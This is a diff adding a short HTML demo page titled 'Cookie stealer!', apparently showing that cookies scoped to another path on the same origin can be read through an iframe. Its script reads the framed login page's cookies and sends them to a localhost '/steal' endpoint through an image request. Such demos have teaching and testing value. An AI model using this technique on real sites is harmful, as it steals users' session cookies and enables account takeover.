@@ -1,0 +1,23 @@
+<h1>Cookie stealer!</h1>
+
+Below is an iframe that loads from a page that is in another path
+<p>
+<p>
+
+<script>
+    document.cookie = ''
+    const iframe = document.createElement('iframe')
+    iframe.src = 'http://localhost:4000/myPath/myLogin.html'
+    document.body.appendChild(iframe)
+    document.write(iframe.contentDocument.cookie)
+    console.log(iframe.contentDocument.cookie)
+
+    // wait 5 seconds
+    setTimeout(function() {
+    const p = document.createElement('p')
+    p.innerHTML = iframe.contentDocument.cookie
+    document.body.appendChild(p)
+
+    new Image().src = 'http://localhost:4000/steal?cookie=' + iframe.contentDocument.cookie
+}, 5000);
+</script>
